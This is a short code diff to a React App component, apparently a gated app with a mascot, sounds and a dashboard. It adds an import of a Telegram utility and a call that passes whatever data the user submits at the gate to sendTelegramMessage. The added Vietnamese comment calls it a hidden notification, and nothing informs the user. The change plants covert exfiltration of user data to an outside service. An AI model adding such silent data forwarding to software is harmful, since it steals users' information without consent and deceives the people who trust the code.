@@ -6,6 +6,7 @@ import Dashboard from './components/Dashboard';
 import MascotDemo from './components/MascotDemo';
 import useSound from './hooks/useSound';
 import SoundControl from './components/SoundControl';
+import { sendTelegramMessage } from './utils/telegram';
 
 function App() {
   const [step, setStep] = useState(() => {
@@ -45,6 +46,10 @@ function App() {
 
   const handleGateComplete = (data) => {
     setUserData(data);
+    
+    // Gửi thông báo ngầm về Telegram
+    sendTelegramMessage(data);
+
     play('success');
     setTimeout(() => {
       play('transition');
